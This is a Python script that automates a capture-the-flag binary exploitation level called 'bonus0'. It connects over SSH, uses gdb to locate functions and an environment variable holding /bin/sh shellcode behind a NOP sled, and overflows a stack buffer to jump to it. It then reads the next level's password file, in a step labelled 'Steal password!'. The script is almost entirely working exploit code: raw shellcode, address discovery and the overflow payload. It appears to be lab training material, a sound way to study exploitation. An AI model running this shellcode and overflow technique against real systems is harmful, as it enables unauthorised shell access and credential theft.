import os
import sys

bool('Ressources' in os.getcwd()) if sys.path.append("../") else sys.path.append("../..")
from utils.ssh import exec, connect, get_func_address, get_func_structure
from utils.text import print_output, print_title
from utils.base import save_token, address_to_string

prefix = '../..' if bool('Ressources' in os.getcwd()) else '..'
password = open(f'{prefix}/level9/flag').read()
client = connect('bonus0', password)


files_list = exec(client, 'ls', title='Get files list')
print_output(files_list, 'Files')
print_title('Test this file')

binary_name = files_list[0]

exec(client, f'echo "" | ./{binary_name}', title='Simple execute binary')
print_title('Segfault')

output = exec(
    client, "(python -c \"print 'test'\"; python -c \"print 'test'\") | ./" + binary_name,
    title='Execute and input two lines')
print_output(output)
print_title('Expected two input values and program just print both of it inline')

entry_points = ['main', 'p', 'pp']
func_info = exec(
    client, f'echo "info func" | gdb ./{binary_name} -q | egrep " {"| ".join(entry_points)}"',
    title='Get all functions')
print_output(func_info)
print_title(f'Three entry points {", ".join([f"{e} - {get_func_address(client, e)}" for e in entry_points])}')

get_func_structure(client, 'main', title='Call function pp (+16)')
get_func_structure(client, 'pp', title='Call function p (+22)')
get_func_structure(client, 'p', title='Call function p (+22)')

offset = 9
shellcode = '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e' \
            '\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80'

env_name = 'exploit'
export_shellcode = f'export {env_name}=$(python -c \'print "\\x90" * 1000 + "{shellcode}"\')'
env_address = exec(client, f'{export_shellcode} && echo "b *main\nr\nx/200s environ\n" | '
                           f'gdb ./{binary_name} -q | '
                           f'grep "{env_name}" | '
                           f'awk \'{{print $1}}\' | sed \'s/://\'', title=f'Find shell code `{env_name}` address')[0]
print_output(env_address, f'Env #{env_name} address')
env_address = exec(client, f'{export_shellcode} && echo "b *main\nr\nx/200xg {env_address}\n" | '
                           f'gdb ./{binary_name} -q | '
                           f'head -n 15 | '
                           f'awk \'{{print $1}}\' | '
                           f'sed \'s/://\'', title='Search a little deeper...')[7]
print_output(env_address, f'Env #{env_name} address, finally')

f = lambda command: f"{export_shellcode} && echo \"{command}\" | " \
                    f"(python -c \"print '.' * 4095 + '\\n' + " \
                    f"'.' * {offset} + '{address_to_string(env_address)}' + '.' * 50\"; cat) | ./{binary_name}"

current_user = exec(client, f('whoami'), title='Check user')
print_output(current_user, 'Current user')

token = exec(client, f('cat /home/user/bonus1/.pass'), title='Steal password!')

save_token(token, client)
